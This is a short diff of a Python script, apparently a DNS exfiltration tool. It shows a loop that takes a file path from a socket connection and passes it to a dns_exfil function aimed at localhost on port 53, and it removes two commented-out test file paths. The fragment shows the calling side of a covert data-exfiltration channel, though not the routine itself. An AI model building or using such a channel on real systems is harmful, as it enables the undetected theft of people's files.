@@ -186,8 +186,6 @@ while i != 6:
             file = (conn.recv(1024)).decode()
             dns_exfil(  host="localhost",
                         path_to_file=file
-                        #path_to_file="./old/lol/test.txt"
-                        #path_to_file="/home/benedict/Dokumente/Schnelltest_200910.pdf"
                         # port[53], max_packet_size=[128], time_delay=[0.01]
                         )
             sleep(10)
